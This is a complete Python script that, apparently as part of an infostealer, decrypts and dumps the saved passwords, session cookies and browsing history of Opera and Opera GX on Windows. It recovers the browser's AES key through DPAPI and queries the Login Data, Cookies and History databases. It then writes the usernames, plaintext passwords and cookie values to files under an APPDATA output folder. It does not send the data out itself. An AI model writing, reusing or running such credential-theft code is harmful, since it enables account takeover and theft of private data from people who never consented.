import os
import json
import sqlite3
import base64
import shutil
import tempfile
from Crypto.Cipher import AES
import win32crypt

PROFILE_PATHS = {
    "Opera": os.path.expandvars(r"%APPDATA%\Opera Software\Opera Stable"),
    "OperaGX": os.path.expandvars(r"%APPDATA%\Opera Software\Opera GX Stable")
}

def get_aes_key(profile_dir):
    # Check both possible locations for Local State
    possible_paths = [
        os.path.join(profile_dir, "Local State"),        # GX case
        os.path.join(os.path.dirname(profile_dir), "Local State")  # Normal Opera case
    ]
    local_state_path = next((p for p in possible_paths if os.path.exists(p)), None)
    if not local_state_path:
        return None
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.load(f)
    encrypted_key_b64 = local_state["os_crypt"]["encrypted_key"]
    encrypted_key = base64.b64decode(encrypted_key_b64)[5:]  # Remove DPAPI prefix
    return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

def decrypt_value(encrypted_value, key):
    try:
        if encrypted_value.startswith(b'v10') or encrypted_value.startswith(b'v11'):
            iv = encrypted_value[3:15]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            decrypted = cipher.decrypt(encrypted_value[15:-16])
            return decrypted.decode()
        else:
            return win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode()
    except Exception:
        return None

def extract_passwords(profile_dir):
    # For Opera GX, files are directly in profile_dir
    # For Opera, files are inside Default
    db_path = os.path.join(profile_dir, "Default", "Login Data")
    if not os.path.exists(db_path):
        db_path = os.path.join(profile_dir, "Login Data")  # GX case
    if not os.path.exists(db_path):
        return []
    key = get_aes_key(profile_dir)
    if not key:
        return []

    temp_db = tempfile.mktemp()
    shutil.copy2(db_path, temp_db)
    conn = sqlite3.connect(temp_db)
    cursor = conn.cursor()
    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
    data = [(url, user, decrypt_value(pwd, key)) for url, user, pwd in cursor.fetchall()]
    conn.close()
    os.remove(temp_db)
    return data

def extract_cookies(profile_dir):
    db_path = os.path.join(profile_dir, "Default", "Network", "Cookies")
    if not os.path.exists(db_path):
        db_path = os.path.join(profile_dir, "Network", "Cookies")  # GX case
    if not os.path.exists(db_path):
        return []
    key = get_aes_key(profile_dir)
    if not key:
        return []

    temp_db = tempfile.mktemp()
    shutil.copy2(db_path, temp_db)
    conn = sqlite3.connect(temp_db)
    cursor = conn.cursor()
    cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
    data = [(host, name, decrypt_value(value, key)) for host, name, value in cursor.fetchall()]
    conn.close()
    os.remove(temp_db)
    return data

def extract_history(profile_dir):
    db_path = os.path.join(profile_dir, "Default", "History")
    if not os.path.exists(db_path):
        db_path = os.path.join(profile_dir, "History")  # GX case
    if not os.path.exists(db_path):
        return []
    temp_db = tempfile.mktemp()
    shutil.copy2(db_path, temp_db)
    conn = sqlite3.connect(temp_db)
    cursor = conn.cursor()
    cursor.execute("SELECT url FROM urls")
    urls = [row[0] for row in cursor.fetchall()]
    conn.close()
    os.remove(temp_db)
    return urls

if __name__ == "__main__":
    base_output = os.path.expandvars(r"%APPDATA%\output\Browsers")
    os.makedirs(base_output, exist_ok=True)

    for name, path in PROFILE_PATHS.items():
        if not os.path.exists(path):
            continue

        output_dir = os.path.join(base_output, name)
        os.makedirs(output_dir, exist_ok=True)

        passwords = extract_passwords(path)
        with open(os.path.join(output_dir, "passwords.txt"), "w", encoding="utf-8") as f:
            for url, user, pwd in passwords:
                f.write(f"URL: {url}\nUsername: {user}\nPassword: {pwd}\n\n")

        cookies = extract_cookies(path)
        with open(os.path.join(output_dir, "cookies.txt"), "w", encoding="utf-8") as f:
            for host, name, value in cookies:
                f.write(f"{host}\t{name}\t{value}\n")

        history = extract_history(path)
        with open(os.path.join(output_dir, "history.txt"), "w", encoding="utf-8") as f:
            for url in history:
                f.write(f"{url}\n")

        print(f"Data exported for {name} to {output_dir}")
